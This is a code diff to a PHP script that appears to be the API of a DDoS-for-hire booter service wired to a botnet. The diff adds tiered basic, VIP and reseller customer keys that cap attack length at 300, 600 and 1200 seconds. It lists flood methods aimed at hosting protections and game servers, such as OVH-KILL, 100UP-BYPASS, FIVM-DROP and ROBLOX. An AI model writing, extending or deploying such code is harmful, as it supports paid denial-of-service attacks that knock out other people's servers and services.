@@ -21,9 +21,14 @@
 
     // Change the arrays to your API Keys and botnets methods
     $basicKey = array("MYKEYS", "STILLMINE", "putyourkeyshere");
+    $vipKey = array("morekeys", "lol");
+    $resllerKey = array("thiskey", "ckckx");
+    $maxBasicTime = 300;
+    $maxVipKey = 600;
+    $maxResellerKey = 1200;
     $methodTypes = array("TCP", "TCP-X", "UDP", "HOME", "HOME-X", "100UP-BYPASS", "OVH-KILL", "SYN", "SYN-KILL", "NFO", "KILLALL", "FIVM-DROP", "ROBLOX", "APEX", "FN", "R6");
     $maxPort = 65535;
-
+    
     $run;
     
 
@@ -55,16 +60,30 @@
     
 
     // Check if keys are right and method is ok
-    if(!in_array($key, $validKeys))
+    if(in_array($key, $basicKey))
     {
-        return die("Invalid Key");
+        $maxTime = 300;
     }
+    else if (in_array($key, $vipKey))
+    {
+        $maxTime = 600;
+    } else if (in_array($key, $resllerKey))
+    {
+        $maxTime = 1200;
+    } else {
+        die("Invalid Key");
+    }
+
 
     if(!in_array($method, $methodTypes))
     {
         return die("Invalid method");
     }
 
+    if($for > $maxTime)
+    {
+        die("You cant hit for that long");
+    }
 
     // Makes sure the port is a integar value and does not go above the max port
     if(filter_var($port, FILTER_VALIDATE_INT) == false || $port > $maxPort)
@@ -123,5 +142,4 @@
     Method: $method <br>
     For: $for <br>
     "
-    
 ?>
